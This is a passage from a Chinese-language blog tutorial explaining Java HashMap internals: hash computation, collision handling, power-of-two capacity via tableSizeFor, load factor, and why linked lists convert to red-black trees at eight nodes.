<span class="title">Demo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HashMap&lt;String, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">"刘德华"</span>, <span class="number">53</span>);</span><br><span class="line">        map.put(<span class="string">"柳岩"</span>, <span class="number">35</span>);</span><br><span class="line">        map.put(<span class="string">"张学友"</span>, <span class="number">55</span>);</span><br><span class="line">        map.put(<span class="string">"郭富城"</span>, <span class="number">52</span>);</span><br><span class="line">        map.put(<span class="string">"黎明"</span>, <span class="number">51</span>);</span><br><span class="line">        map.put(<span class="string">"林青霞"</span>, <span class="number">55</span>);</span><br><span class="line">        map.put(<span class="string">"刘德华"</span>, <span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094444.png" alt=""></p><p>说明：</p><p>1.面试题：HashMap中hash函数是怎么实现的？还有哪些hash函数的实现方式？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于key的hashCode做hash操作，无符号右移16位然后做异或运算。</span><br><span class="line">还有平方取中法，伪随机数法和取余数法。这三种效率都比较低。而无符号右移16位异或运算效率是最高的。至于底层是如何计算的我们下面看源码时给大家讲解。</span><br></pre></td></tr></table></figure><p>2.面试题：当两个对象的hashCode相等时会怎么样？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">会产生哈希碰撞，若key值内容相同则替换旧的value.不然连接到链表后面，链表长度超过阈值8就转换为红黑树存储。</span><br></pre></td></tr></table></figure><p>3.面试题：何时发生哈希碰撞和什么是哈希碰撞,如何解决哈希碰撞？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只要两个元素的key计算的哈希码值相同就会发生哈希碰撞。jdk8前使用链表解决哈希碰撞。jdk8之后使用链表+红黑树解决哈希碰撞。</span><br></pre></td></tr></table></figure><p>4.面试题：如果两个键的hashcode相同，如何存储键值对？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcode相同，通过equals比较内容是否相同。</span><br><span class="line">相同：则新的value覆盖之前的value</span><br><span class="line">不相同：则将新的键值对添加到哈希表中</span><br></pre></td></tr></table></figure><p>5.在不断的添加数据的过程中，会涉及到扩容问题，当超出临界值(且要存放的位置非空)时，扩容。默认的扩容方式：扩容为原来容量的2倍，并将原有的数据复制过来。</p><p>6.通过上述描述，当位于一个链表中的元素较多，即hash值相等但是内容不相等的元素较多时，通过key值依次查找的效率较低。而<strong>JDK1.8</strong>中，哈希表存储采用数组+链表+红黑树实现，当链表长度(阀值)超过 8 时且当前数组的长度 &gt; 64时，将链表转换为红黑树，这样大大减少了查找时间。jdk8在哈希表中引入红黑树的原因只是为了查找效率更高。</p><p>简单的来说，哈希表是由数组+链表+红黑树（JDK1.8增加了红黑树部分）实现的。如下图所示。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094440.png" alt=""></p><p> <strong>但是这样的话问题来了，传统hashMap的缺点，1.8为什么引入红黑树？这样结构的话不是更麻烦了吗，为何阈值大于8换成红黑树？</strong></p><p> JDK 1.8 以前 HashMap 的实现是 数组+链表，即使哈希函数取得再好，也很难达到元素百分百均匀分布。当 HashMap 中有大量的元素都存放到同一个桶中时，这个桶下有一条长长的链表，这个时候 HashMap 就相当于一个单链表，假如单链表有 n 个元素，遍历的时间复杂度就是 O(n)，完全失去了它的优势。针对这种情况，JDK 1.8 中引入了 红黑树（查找时间复杂度为 O(logn)）来优化这个问题。 当链表长度很小的时候，即使遍历，速度也非常快，但是当链表长度不断变长，肯定会对查询性能有一定的影响，所以才需要转成树。</p><p>至于为什么阈值是8，我想，去源码中找寻答案应该是最可靠的途径。 下面我们在分析源码的时候会介绍。</p><p><strong>7.总结：</strong></p><p>上述我们大概阐述了HashMap底层存储数据的方式。为了方便大家更好的理解，我们结合一个存储流程图来进一步说明一下：(jdk8存储过程)</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094434.png" alt=""></p><p>说明：</p><p>1.size表示 HashMap中K-V的实时数量 ， 注意这个不等于数组的长度 。 </p><p>2.threshold( 临界值)  =capacity(容量) * loadFactor( 加载因子 )。这个值是当前已占用数组长度的最大值。size超过这个临界值就重新resize(扩容)，扩容后的 HashMap 容量是之前容量的两倍 。</p><h2 id="HashMap继承关系"><a href="#HashMap继承关系" class="headerlink" title="HashMap继承关系"></a>HashMap继承关系</h2><p>HashMap继承关系如下图所示：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094430.bmp" alt=""></p><p>说明：</p><ul><li>Cloneable 空接口，表示可以克隆。 创建并返回HashMap对象的一个副本。</li><li>Serializable 序列化接口。属于标记性接口。HashMap对象可以被序列化和反序列化。</li><li>AbstractMap 父类提供了Map实现接口。以最大限度地减少实现此接口所需的工作。</li></ul><p>补充：通过上述继承关系我们发现一个很奇怪的现象， 就是HashMap已经继承了AbstractMap而AbstractMap类实现了Map接口，那为什么HashMap还要在实现Map接口呢？同样在ArrayList中LinkedList中都是这种结构。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">据 java 集合框架的创始人Josh Bloch描述，这样的写法是一个失误。在java集合框架中，类似这样的写法很多，最开始写java集合框架的时候，他认为这样写，在某些地方可能是有价值的，直到他意识到错了。显然的，JDK的维护者，后来不认为这个小小的失误值得去修改，所以就这样存在下来了。</span><br></pre></td></tr></table></figure><h2 id="HashMap集合类的成员"><a href="#HashMap集合类的成员" class="headerlink" title="HashMap集合类的成员"></a>HashMap集合类的成员</h2><h3 id="成员变量"><a href="#成员变量" class="headerlink" title="成员变量"></a>成员变量</h3><p>1.序列化版本号</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">362498820763181265L</span>;</span><br></pre></td></tr></table></figure><p>2.集合的初始化容量( <strong>必须是二的n次幂</strong> )</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//默认的初始容量是16 -- 1&lt;&lt;4相当于1*2的4次方---1*16</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_INITIAL_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">4</span>;</span><br></pre></td></tr></table></figure><p>问题： <strong>为什么必须是2的n次幂？如果输入值不是2的幂比如10会怎么样？</strong> </p><p>HashMap构造方法还可以指定集合的初始化容量大小：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap(<span class="keyword">int</span> initialCapacity) 构造一个带指定初始容量和默认加载因子 (<span class="number">0.75</span>) 的空 HashMap。</span><br></pre></td></tr></table></figure><p> 根据上述讲解我们已经知道，当向HashMap中添加一个元素的时候，需要根据key的hash值，去确定其在数组中的具体位置。 HashMap为了存取高效，要尽量较少碰撞，就是要尽量把数据分配均匀，每个链表长度大致相同，这个实现就在把数据存到哪个链表中的算法。</p><p>这个算法实际就是取模，hash%length，计算机中直接求余效率不如位移运算(这点上述已经讲解)。所以源码中做了优化,使用 hash&amp;(length-1)，而实际上hash%length等于hash&amp;(length-1)的前提是length是2的n次幂。</p><p>为什么这样能均匀分布减少碰撞呢？2的n次方实际就是1后面n个0，2的n次方-1  实际就是n个1；</p><p>举例：</p><p><strong>说明：按位与运算：相同的二进制数位上，都是1的时候，结果为1，否则为零。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">例如长度为<span class="number">8</span>时候，<span class="number">3</span>&amp;(<span class="number">8</span>-<span class="number">1</span>)=<span class="number">3</span>  <span class="number">2</span>&amp;(<span class="number">8</span>-<span class="number">1</span>)=<span class="number">2</span> ，不同位置上，不碰撞；</span><br><span class="line">例如长度length为<span class="number">8</span>时候，<span class="number">8</span>是<span class="number">2</span>的<span class="number">3</span>次幂。二进制是：<span class="number">1000</span></span><br><span class="line">length-<span class="number">1</span> 二进制运算：</span><br><span class="line"><span class="number">1000</span></span><br><span class="line">-   <span class="number">1</span></span><br><span class="line">---------------------</span><br><span class="line">     <span class="number">111</span></span><br><span class="line">如下所示：</span><br><span class="line">hash&amp;(length-<span class="number">1</span>)</span><br><span class="line"><span class="number">3</span>   &amp;(<span class="number">8</span>    - <span class="number">1</span>)=<span class="number">3</span>  </span><br><span class="line"><span class="number">00000011</span>  <span class="number">3</span> hash</span><br><span class="line">&amp;   <span class="number">00000111</span>  <span class="number">7</span> length-<span class="number">1</span></span><br><span class="line">---------------------</span><br><span class="line"><span class="number">00000011</span>-----》<span class="number">3</span> 数组下标</span><br><span class="line"></span><br><span class="line">hash&amp;(length-<span class="number">1</span>)</span><br><span class="line"><span class="number">2</span> &amp;  (<span class="number">8</span> -    <span class="number">1</span>) = <span class="number">2</span>  </span><br><span class="line"><span class="number">00000010</span>  <span class="number">2</span> hash</span><br><span class="line">&amp;   <span class="number">00000111</span>  <span class="number">7</span> length-<span class="number">1</span></span><br><span class="line">---------------------</span><br><span class="line"><span class="number">00000010</span>-----》<span class="number">2</span>  数组下标</span><br><span class="line">说明：上述计算结果是不同位置上，不碰撞；</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">例如长度为<span class="number">9</span>时候，<span class="number">3</span>&amp;(<span class="number">9</span>-<span class="number">1</span>)=<span class="number">0</span>  <span class="number">2</span>&amp;(<span class="number">9</span>-<span class="number">1</span>)=<span class="number">0</span> ，都在<span class="number">0</span>上，碰撞了；</span><br><span class="line">例如长度length为<span class="number">9</span>时候，<span class="number">9</span>不是<span class="number">2</span>的n次幂。二进制是：<span class="number">00001001</span></span><br><span class="line">length-<span class="number">1</span> 二进制运算：</span><br><span class="line"><span class="number">1001</span></span><br><span class="line">-   <span class="number">1</span></span><br><span class="line">---------------------</span><br><span class="line">    <span class="number">1000</span></span><br><span class="line">如下所示：</span><br><span class="line">hash&amp;(length-<span class="number">1</span>)</span><br><span class="line"><span class="number">3</span>   &amp;(<span class="number">9</span>    - <span class="number">1</span>)=<span class="number">0</span>  </span><br><span class="line"><span class="number">00000011</span>  <span class="number">3</span> hash</span><br><span class="line">&amp;   <span class="number">00001000</span>  <span class="number">8</span> length-<span class="number">1</span> </span><br><span class="line">---------------------</span><br><span class="line"><span class="number">00000000</span>-----》<span class="number">0</span>  数组下标</span><br><span class="line"></span><br><span class="line">hash&amp;(length-<span class="number">1</span>)</span><br><span class="line"><span class="number">2</span> &amp;  (<span class="number">9</span> -    <span class="number">1</span>) = <span class="number">2</span>  </span><br><span class="line"><span class="number">00000010</span> <span class="number">2</span> hash</span><br><span class="line">&amp;   <span class="number">00001000</span> <span class="number">8</span> length-<span class="number">1</span> </span><br><span class="line">---------------------</span><br><span class="line"><span class="number">00000000</span>-----》<span class="number">0</span>  数组下标</span><br><span class="line">说明：上述计算结果都在<span class="number">0</span>上，碰撞了；</span><br></pre></td></tr></table></figure><p><strong>注意： 当然如果不考虑效率直接求余即可（就不需要要求长度必须是2的n次方了）</strong> </p><p>小结：</p><p>​    1.由上面可以看出，当我们根据key的hash确定其在数组的位置时，如果n为2的幂次方，可以保证数据的均匀插入，如果n不是2的幂次方，可能数组的一些位置永远不会插入数据，浪费数组的空间，加大hash冲突。</p><p>​    2.另一方面，一般我们可能会想通过 % 求余来确定位置，这样也可以，只不过性能不如 &amp; 运算。而且当length是2的幂次方时：hash &amp; (length - 1) == hash % length</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xx...xx &#x3D; x*2^(n-1) + x*2^(n-2) +...+ x*2^1 + x*2^0</span><br><span class="line">这个数处以一个2^m次方</span><br><span class="line">xx...xx &#x2F; 2^m</span><br><span class="line">&#x3D; ( x*2^(n-1) + x*2^(n-2) +...+ x*2^1 + x*2^0 ) &#x2F; 2^m</span><br><span class="line">&#x3D; x*2^(n-1-m) + x*2^(n-2-m) +... + x*2^(m-m) + x*2^(m-1-m) + ... + x*2^(0-m)</span><br><span class="line">x*2^(m-m) &#x3D; x*2^0 ，这就是所得二进制数的最低位，而其后面的那些项x*2^(m-1-m) + ... + x*2^(0-m)</span><br><span class="line">就是余数</span><br><span class="line">xx...xx &amp; (2^m -1) 相当于取出了xx...xx 的低 m 位二进制数，也就是上面所说的右移出去的那m位数，也就是余数</span><br></pre></td></tr></table></figure><p>​    3.因此，HashMap 容量为2次幂的原因，就是为了数据的的均匀分布，减少hash冲突，毕竟hash冲突越大，代表数组中一个链的长度越大，这样的话会降低hashmap的性能</p><p>​    <strong>4.如果创建HashMap对象时，输入的数组长度是10，不是2的幂，HashMap通过一通位移运算和或运算得到的肯定是2的幂次数，并且是离那个数最近的数字。</strong></p><p>源代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建HashMap集合的对象，指定数组长度是10，不是2的幂</span></span><br><span class="line">HashMap hashMap = <span class="keyword">new</span> HashMap(<span class="number">10</span>);</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;<span class="comment">//initialCapacity=10</span></span><br><span class="line">   <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;<span class="comment">//initialCapacity=10</span></span><br><span class="line">     <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal initial capacity: "</span> +</span><br><span class="line">                                               initialCapacity);</span><br><span class="line">        <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">            initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">        <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Illegal load factor: "</span> +</span><br><span class="line">                                               loadFactor);</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity);<span class="comment">//initialCapacity=10</span></span><br><span class="line">&#125;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Returns a power of two size for the given target capacity.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">tableSizeFor</span><span class="params">(<span class="keyword">int</span> cap)</span> </span>&#123;<span class="comment">//int cap = 10</span></span><br><span class="line">        <span class="keyword">int</span> n = cap - <span class="number">1</span>;</span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">1</span>;<span class="comment">//假如最高位1移动一位再或运算，变成11</span></span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">2</span>;<span class="comment">//11移动两位再或运算，变成1111</span></span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">4</span>;<span class="comment">//1111移动四位再或运算，变成11111111</span></span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">8</span>;<span class="comment">//11111111移动八位再或运算，变成1111111111111111</span></span><br><span class="line">        n |= n &gt;&gt;&gt; <span class="number">16</span>;<span class="comment">//1111111111111111移动十六位再或运算，变成11111111111111111111111111111111</span></span><br><span class="line">        <span class="keyword">return</span> (n &lt; <span class="number">0</span>) ? <span class="number">1</span> : (n &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : n + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>说明：</p><p>由此可以看到，当在实例化HashMap实例时，如果给定了initialCapacity(假设是10)，由于HashMap的capacity必须都是2的幂，因此这个方法用于找到大于等于initialCapacity(假设是10)的最小的2的幂（initialCapacity如果就是2的幂，则返回的还是这个数）。</p><p>下面分析这个算法：<br>1)、首先，为什么要对cap做减1操作。int n = cap - 1;<br>这是为了防止，cap已经是2的幂。如果cap已经是2的幂， 又没有执行这个减1操作，则执行完后面的几条无符号右移操作之后，返回的capacity将是这个cap的2倍。如果不懂，要看完后面的几个无符号右移之后再回来看看。</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615193553.png" alt="image-20210615193541433"></p><p>下面看看这几个无符号右移操作：<br>2）、如果n这时为0了（经过了cap-1之后），则经过后面的几次无符号右移依然是0，最后返回的capacity是        1（最后有个n+1的操作）。<br>这里只讨论n不等于0的情况。</p><p>3）、注意：<strong>|（按位或运算）：运算规则：相同的二进制数位上，都是0的时候，结果为0，否则为1。</strong></p><p>​     <strong>第一次右移</strong> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> n = cap - <span class="number">1</span>;<span class="comment">//cap=10  n=9</span></span><br><span class="line">n |= n &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00001001</span> <span class="comment">//9</span></span><br><span class="line">|</span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000100</span> <span class="comment">//9右移之后变为4</span></span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00001101</span> <span class="comment">//按位异或之后是13</span></span><br></pre></td></tr></table></figure><p> 由于n不等于0，则n的二进制表示中总会有一bit为1，这时考虑最高位的1。通过无符号右移1位，则将最高位的1右移了1位，再做或操作，使得n的二进制表示中与最高位的1紧邻的右边一位也为1，如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00001101</span></span><br></pre></td></tr></table></figure><p> <strong>第二次右移</strong> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> n |= n &gt;&gt;&gt; <span class="number">2</span>;<span class="comment">//n通过第一次右移变为了：n=13</span></span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00001101</span>  <span class="comment">// 13</span></span><br><span class="line">|</span><br><span class="line">    <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000011</span>  <span class="comment">//13右移之后变为3</span></span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00001111</span> <span class="comment">//按位异或之后是15</span></span><br></pre></td></tr></table></figure><p> 注意，这个n已经经过了<code>n |= n &gt;&gt;&gt; 1;</code> 操作。假设此时n为00000000 00000000 00000000 00001101 ，则n无符号右移两位，会将最高位两个连续的1右移两位，然后再与原来的n做或操作，这样n的二进制表示的高位中会有4个连续的1。如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00001111</span> <span class="comment">//按位异或之后是15</span></span><br></pre></td></tr></table></figure><p> <strong>第三次右移</strong> :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">n |= n &gt;&gt;&gt; <span class="number">4</span>;<span class="comment">//n通过第一、二次右移变为了：n=15</span></span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00001111</span>  <span class="comment">// 15</span></span><br><span class="line">|</span><br><span class="line">    <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span>  <span class="comment">//15右移之后变为0</span></span><br><span class="line">-------------------------------------------------</span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00001111</span> <span class="comment">//按位异或之后是15</span></span><br></pre></td></tr></table></figure><p>这次把已经有的高位中的连续的4个1，右移4位，再做或操作，这样n的二进制表示的高位中正常会有8个连续的1。如00001111 1111xxxxxx 。<br>以此类推<br>注意，容量最大也就是32bit的正数，因此最后n |= n &gt;&gt;&gt; 16; ，最多也就32个1（但是这已经是负数了。在执行tableSizeFor之前，对initialCapacity做了判断，如果大于MAXIMUM_CAPACITY(2 ^ 30，即只有第31位为1，经过上述操作会使得第31位后面的所有位都为1)，则取MAXIMUM_CAPACITY。如果等于MAXIMUM_CAPACITY(2 ^ 30)，先减一，再执行移位操作。所以这里面的移位操作之后，最大30个1，不会大于等于MAXIMUM_CAPACITY。30个1，加1之后得2 ^ 30） 。<br>请看下面的一个完整例子：</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210615094422.png" alt="image-20191115151657917"></p><p>  注意，得到的这个capacity却被赋值给了threshold。 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity);<span class="comment">//initialCapacity=10</span></span><br></pre></td></tr></table></figure><p>3.默认的负载因子，默认值是0.75 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span> DEFAULT_LOAD_FACTOR = <span class="number">0.75f</span>;</span><br></pre></td></tr></table></figure><p>4.集合最大容量 </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//集合最大容量的上限是：2的30次幂</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAXIMUM_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br></pre></td></tr></table></figure><p>5.当链表的值超过8则会转红黑树(<strong>1.8新增</strong>) </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//当桶(bucket)上的结点数大于这个值时会转成红黑树</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TREEIFY_THRESHOLD = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p><strong>问题：为什么Map桶中节点个数超过8才转为红黑树？</strong></p><p>8这个阈值定义在HashMap中，针对这个成员变量，在源码的注释中只说明了8是bin（bin就是bucket(桶)）从链表转成树的阈值，但是并没有说明为什么是8： </p><p> 在HashMap中有一段注释说明： 我们继续往下看 :</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Because TreeNodes are about twice the size of regular nodes, <span class="function">we use them only when bins contain enough nodes to warrant <span class="title">use</span> <span class="params">(see TREEIFY_THRESHOLD)</span>. And when they become too <span class="title">small</span> <span class="params">(due to removal or resizing)</span> they are converted back to plain bins.  In usages with well-distributed user hashCodes, tree bins are rarely used.  Ideally, under random hashCodes, the frequency of nodes in bins follows a Poisson distribution</span></span><br><span class="line"><span class="function"><span class="params">(http://en.wikipedia.org/wiki/Poisson_distribution)</span> with a parameter of about 0.5 on average <span class="keyword">for</span> the <span class="keyword">default</span> resizing threshold of 0.75, although with a large variance because of resizing granularity. Ignoring variance, the expected occurrences of list size k <span class="title">are</span> <span class="params">(exp(<span class="number">-0.5</span>)</span>*<span class="title">pow</span><span class="params">(<span class="number">0.5</span>, k)</span>/<span class="title">factorial</span><span class="params">(k)</span>).</span></span><br><span class="line"><span class="function">The first values are:</span></span><br><span class="line"><span class="function">因为树节点的大小大约是普通节点的两倍，所以我们只在箱子包含足够的节点时才使用树节点<span class="params">(参见TREEIFY_THRESHOLD)</span>。当它们变得太小<span class="params">(由于删除或调整大小)</span>时，就会被转换回普通的桶。在使用分布良好的用户hashcode时，很少使用树箱。理想情况下，在随机哈希码下，箱子中节点的频率服从泊松分布</span></span><br><span class="line"><span class="function"><span class="params">(http://en.wikipedia.org/wiki/Poisson_distribution)</span>，默认调整阈值为0.75，平均参数约为0.5，尽管由于调整粒度的差异很大。忽略方差，列表大小k的预期出现次数是<span class="params">(exp(<span class="number">-0.5</span>)</span>*<span class="title">pow</span><span class="params">(<span class="number">0.5</span>, k)</span>/<span class="title">factorial</span><span class="params">(k)</span>)。</span></span><br><span class="line"><span class="function">第一个值是:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">0:    0.60653066</span></span><br><span class="line"><span class="function">1:    0.30326533</span></span><br><span class="line"><span class="function">2:    0.07581633</span></span><br><span class="line"><span class="function">3:    0.01263606</span></span><br><span class="line"><span class="function">4:    0.00157952</span></span><br><span class="line"><span class="function">5:    0.00015795</span></span><br><span class="line"><span class="function">6:    0.00001316</span></span><br><span class="line"><span class="function">7:    0.00000094</span></span><br><span class="line"><span class="function">8:    0.00000006</span></span><br><span class="line"><span class="function">more: less than 1 in ten million</span></span><br></pre></td></tr></table></figure><p>TreeNodes占用空间是普通Nodes的两倍，所以只有当bin包含足够多的节点时才会转成TreeNodes，而是否足够多就是由TREEIFY_THRESHOLD的值决定的。当bin中节点数变少时，又会转成普通的bin。并且我们查看源码的时候发现，链表长度达到8就转成红黑树，当长度降到6就转成普通bin。</p><p>这样就解释了为什么不是一开始就将其转换为TreeNodes，而是需要一定节点数才转为TreeNodes，说白了就是权衡，<strong>空间和时间的权衡</strong>。</p><p> 这段内容还说到：当hashCode离散性很好的时候，树型bin用到的概率非常小，因为数据均匀分布在每个bin中，几乎不会有bin中链表长度会达到阈值。但是在随机hashCode下，离散性可能会变差，然而JDK又不能阻止用户实现这种不好的hash算法，因此就可能导致不均匀的数据分布。不过理想情况下随机hashCode算法下所有bin中节点的分布频率会遵循泊松分布，我们可以看到，<strong>一个bin中链表长度达到8个元素的概率为0.00000006，几乎是不可能事件。所以，之所以选择8，不是随便决定的，而是根据概率统计决定的</strong>。由此可见，发展将近30年的Java每一项改动和优化都是非常严谨和科学的。 